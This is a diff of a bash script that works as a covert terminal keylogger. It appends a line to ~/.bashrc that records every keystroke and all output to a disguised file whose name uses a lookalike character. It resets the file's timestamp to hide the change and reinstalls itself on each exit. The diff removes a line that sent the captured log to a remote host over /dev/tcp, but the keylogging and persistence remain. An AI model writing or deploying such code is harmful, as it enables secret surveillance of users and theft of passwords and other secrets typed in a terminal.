@@ -1,13 +1,13 @@
 #!/bin/bash
+# CUSTIMIZE BEFORE UPLOAD
 
 fakerc=~/.bаsh_login
 logfile=~/.bаsh_cache
-remote=/dev/tcp/10.0.2.4/1234
 waitsec=1
 changetime=$(stat -c %Y ~/.bashrc)
 
 read script <<EOF
-exec script -B "$logfile" -fqc "bash --rcfile '$fakerc'"
+exec script -B "$logfile" -afqc "bash --rcfile '$fakerc'"
 EOF
 quoted=$(printf "%q" "$script")
 
@@ -19,7 +19,7 @@ printvar() { printf " + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n" $1 "${!1}"; }
 printvar fakerc
 printvar logfile
 printvar script
-printvar remote
+printvar quoted
 
 print "\e[5;7m  wait for \e[1m$waitsec\e[0;5;7m secs, ctrl+c to interrupt  \e[m"
 sleep $waitsec
@@ -33,7 +33,7 @@ self=\$(printf "%q" "\$self")
 rm -f "$fakerc"
 sed -i "/^exec script -B/d" ~/.bashrc
 touch -d @$changetime ~/.bashrc
-trap "2>/dev/null cat '$logfile' > '$remote' && echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'; rm -f '$logfile'" EXIT
+trap "echo $quoted >> ~/.bashrc && echo \$self > '$fakerc'" EXIT
 unset self
 . ~/.bashrc
 EOF
